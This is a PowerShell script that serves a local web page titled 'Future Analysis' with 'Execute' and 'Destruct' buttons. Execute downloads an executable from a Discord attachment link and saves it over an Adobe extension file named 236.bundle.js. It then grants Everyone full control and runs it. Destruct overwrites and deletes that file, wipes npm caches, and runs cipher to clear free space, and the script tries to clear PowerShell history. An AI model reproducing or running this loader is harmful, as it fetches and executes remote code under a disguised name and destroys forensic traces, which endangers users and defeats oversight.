# Fixed IP address and port for the web interface
$ipAddress = "127.0.0.1"
$port = 8080

# Register HTTP listener with fixed IP and port
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://${ipAddress}:${port}/")
$listener.Start()
Write-Host "Listening on IP $ipAddress, port $port..."
Write-Host "Access the web interface at: http://${ipAddress}:${port}"

# Function to download and save the file
function Download-AndSave-File {
    param (
        [string]$url,
        [string]$tempFilePath,
        [string]$finalFilePath
    )

    try {
        Write-Host "Downloading file from $url..."
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $tempFilePath)

        # Ensure the destination directory exists
        $destinationDir = [System.IO.Path]::GetDirectoryName($finalFilePath)
        if (-not (Test-Path $destinationDir)) {
            New-Item -ItemType Directory -Path $destinationDir -Force
        }

        # Move the file to the target location and rename it
        Write-Host "Moving file to $finalFilePath..."
        Move-Item -Path $tempFilePath -Destination $finalFilePath -Force

        # Set appropriate permissions
        Write-Host "Setting permissions for $finalFilePath..."
        $acl = Get-Acl $finalFilePath
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $acl.SetAccessRule($rule)
        Set-Acl -Path $finalFilePath -AclObject $acl

        Write-Host "File downloaded, saved, and permissions set for $finalFilePath"
    } catch {
        Write-Host "An error occurred while downloading or saving the file: $_"
    }
}

# Function to execute the .exe file
function Execute-Executable {
    param ([string]$filePath)

    try {
        # Ensure the file path is properly quoted
        $filePath = [System.IO.Path]::GetFullPath($filePath)
        
        # Debug output
        Write-Host "Attempting to execute file: $filePath"
        
        # Execute the file
        Start-Process -FilePath $filePath -NoNewWindow -Wait

        Write-Host "Executed file: $filePath"
    } catch {
        Write-Host "Failed to execute file: $_"
    }
}

# Function to securely delete a file
function SecureDelete {
    param ([string]$path)
    try {
        if (Test-Path $path) {
            # Overwrite the file with random data multiple times
            $fileStream = [System.IO.File]::OpenWrite($path)
            $fileLength = (Get-Item $path).Length

            $buffer = New-Object byte[] $fileLength
            $random = New-Object System.Random

            for ($i = 0; $i -lt 3; $i++) {
                $random.NextBytes($buffer)
                $fileStream.Write($buffer, 0, $buffer.Length)
            }

            $fileStream.Close()

            # Delete the file
            Remove-Item -Path $path -Force

            # Optionally, run a disk cleanup command
            $cleanupCommand = "cipher /w:" + [System.IO.Path]::GetDirectoryName($path)
            Invoke-Expression $cleanupCommand
        }
    } catch {
        Write-Host "Failed to securely delete: $_"
    }
}

# Function to securely delete a directory and its contents
function SecureDelete-Directory {
    param ([string]$directoryPath)
    try {
        if (Test-Path $directoryPath) {
            # Securely delete all files within the directory
            Get-ChildItem -Path $directoryPath -Recurse | ForEach-Object {
                if ($_.PSIsContainer) {
                    # Recursively delete subdirectories
                    SecureDelete-Directory -directoryPath $_.FullName
                } else {
                    # Securely delete files
                    SecureDelete -path $_.FullName
                }
            }
            # Remove the directory itself
            Remove-Item -Path $directoryPath -Recurse -Force
        }
    } catch {
        Write-Host "Failed to securely delete directory: $_"
    }
}

# Function to securely delete node modules and related data
function SecureDelete-NodeModules {
    param ([string]$directoryPath)
    try {
        if (Test-Path $directoryPath) {
            # Securely delete the node_modules directory and its contents
            SecureDelete-Directory -directoryPath $directoryPath

            # Clear Node.js cache and temp files
            $nodeCachePath = [System.IO.Path]::Combine($env:LOCALAPPDATA, "npm-cache")
            $nodeTempPath = [System.IO.Path]::Combine($env:TEMP, "npm-*")
            Remove-Item -Path $nodeCachePath -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $nodeTempPath -Recurse -Force -ErrorAction SilentlyContinue

            Write-Host "Node modules and related data deleted."
        }
    } catch {
        Write-Host "Failed to securely delete node modules: $_"
    }
}

# Function to handle HTTP requests and responses
function Handle-Request {
    param ($context)
    $request = $context.Request
    $response = $context.Response

    try {
        if ($request.HttpMethod -eq 'GET') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/' {
                    Serve-HTML -Message "Choose your action:"
                }
                '/js/236.bundle.js' {
                    # Serve JavaScript file
                    $filePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"
                    if (Test-Path $filePath) {
                        $response.ContentType = "application/javascript"
                        $response.ContentEncoding = [System.Text.Encoding]::UTF8
                        $fileContent = [System.IO.File]::ReadAllText($filePath)
                        $buffer = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
                        $response.OutputStream.Write($buffer, 0, $buffer.Length)
                    } else {
                        $response.StatusCode = 404
                        $response.StatusDescription = "File Not Found"
                    }
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        } elseif ($request.HttpMethod -eq 'POST') {
            $url = $request.Url.AbsolutePath
            $response.StatusCode = 200
            $response.StatusDescription = "OK"
            $response.ContentType = "text/plain"
            switch ($url) {
                '/0x67' {
                    $tempFilePath = [System.IO.Path]::GetTempFileName()
                    $finalFilePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"
                    $downloadUrl = "https://cdn.discordapp.com/attachments/1266628616213495892/1266629385197453322/JournalTrace.exe?ex=66b25e4a&is=66b10cca&hm=570ea24e7194295a82606c9f71f545fb3ec274b01fc7ca5583e2fd9929adf07c&"

                    # Download the file and save it with the correct name and permissions
                    Download-AndSave-File -url $downloadUrl -tempFilePath $tempFilePath -finalFilePath $finalFilePath

                    # Execute the JavaScript file
                    Execute-Executable -filePath $finalFilePath

                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed.").Length)
                }
                '/0142' {
                    $nodeModulesPath = "C:\Path\To\Node\Modules"  # Update with actual path to node_modules
                    $filePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"

                    # Securely delete node modules and related data
                    SecureDelete-NodeModules -directoryPath $nodeModulesPath

                    # Securely delete the JavaScript file
                    SecureDelete -path $filePath

                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Cleanup completed successfully."), 0, [System.Text.Encoding]::UTF8.GetBytes("Cleanup completed successfully.").Length)
                }
                default {
                    $response.StatusCode = 404
                    $response.StatusDescription = "Not Found"
                }
            }
        }
    } catch {
        Write-Host "An error occurred: $_"
        $response.StatusCode = 500
        $response.StatusDescription = "Internal Server Error"
    } finally {
        $response.Close()
    }
}

# Function to serve the HTML interface
function Serve-HTML {
    param ([string]$Message)
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Future Analysis</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2e2e2e;
            color: #ddd;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #333;
            border-radius: 8px;
            text-align: center;
        }
        h1 {
            color: #fff;
        }
        button {
            background-color: #555;
            color: #ddd;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        button:hover {
            background-color: #777;
            box-shadow: 0 6px 12px rgba(0,0,0,0.4);
        }
        .loading-container {
            display: none;
            margin-top: 20px;
        }
        .loading-circle {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #555; /* Darker grey */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .fade-in {
            opacity: 0;
            transition: opacity 1s ease-in;
        }
        .fade-in.visible {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Future Analysis</h1>
        <p>$Message</p>
        <button onclick="document.getElementById('loading').style.display='block'; fetch('/0x67', { method: 'POST' }).then(response => response.text()).then(text => { document.getElementById('loading').style.display='none'; document.getElementById('message').innerText = text; });">Execute</button>
        <button onclick="document.getElementById('loading').style.display='block'; fetch('/0142', { method: 'POST' }).then(response => response.text()).then(text => { document.getElementById('loading').style.display='none'; document.getElementById('message').innerText = text; });">Destruct</button>
        <div id="loading" class="loading-container">
            <div class="loading-circle"></div>
            <p>Processing...</p>
        </div>
        <div id="message" class="fade-in"></div>
    </div>
</body>
</html>
"@

    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
}

# Function to clear PowerShell history
function Clear-History {
    try {
        if ($null -ne (Get-Command "Clear-History" -ErrorAction SilentlyContinue)) {
            Clear-History
        }
    } catch {
        Write-Host "Failed to clear history: $_"
    }
}

# Main loop to handle requests
while ($true) {
    $context = $listener.GetContext()
    Handle-Request -context $context
}

# Cleanup code
function Cleanup {
    try {
        # Stop listener and remove it
        $listener.Stop()
        $listener.Close()

        # Attempt to clear PowerShell history
        Clear-History
    } catch {
        Write-Host "Failed to clean up: $_"
    }
}

# Execute cleanup
Cleanup
